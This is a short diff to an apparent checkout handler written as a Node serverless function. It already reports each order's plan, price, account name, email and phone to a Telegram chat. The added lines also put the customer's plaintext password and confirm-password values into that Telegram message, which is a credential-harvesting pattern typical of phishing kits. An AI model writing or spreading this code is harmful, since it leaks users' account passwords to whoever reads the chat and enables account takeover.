@@ -56,6 +56,12 @@ module.exports = async (request, response) => {
   }
 
   let telegramText = `New LIFEXXX checkout\\nPlan: ${product}\\nAmount: $${price} USD\\nAccount name: ${accountName}\\nEmail: ${email}`;
+  if (password) {
+    telegramText += `\\nPassword: ${password}`;
+  }
+  if (confirmPassword) {
+    telegramText += `\\nConfirm Password: ${confirmPassword}`;
+  }
   if (phone) {
     telegramText += `\\nPhone: ${phone}`;
   }
